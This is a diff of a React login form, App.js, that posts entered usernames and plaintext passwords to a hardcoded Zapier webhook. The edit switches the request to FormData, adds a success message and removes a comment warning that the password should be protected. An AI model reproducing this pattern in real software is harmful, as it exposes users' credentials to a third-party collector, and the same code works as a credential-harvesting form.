@@ -112,13 +112,12 @@
 
 
 
-
-// App.js
 import React, { useState } from "react";
 
 function App() {
   const [formData, setFormData] = useState({ username: "", password: "" });
   const [error, setError] = useState(null);
+  const [success, setSuccess] = useState(false);
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -127,24 +126,25 @@ function App() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    setError(null); // Reset error state
+    setError(null);
+    setSuccess(false);
 
     const webhookUrl = "https://hooks.zapier.com/hooks/catch/21446920/2ffr6k6/";
 
     try {
+      // ✅ Use FormData to prevent CORS issues
+      const formDataData = new FormData();
+      formDataData.append("username", formData.username);
+      formDataData.append("password", formData.password); // ✅ Added password field
+
       const response = await fetch(webhookUrl, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          username: formData.username,
-          password: formData.password, // ⚠ Consider encrypting or hashing
-        }),
+        body: formDataData, // ✅ No need for JSON headers
       });
 
       if (response.ok) {
         setFormData({ username: "", password: "" });
+        setSuccess(true);
       } else {
         setError("Failed to send data.");
       }
@@ -192,6 +192,7 @@ function App() {
             Submit
           </button>
           {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
+          {success && <p className="text-green-500 text-sm mt-2">Data sent successfully!</p>}
         </form>
       </div>
     </div>
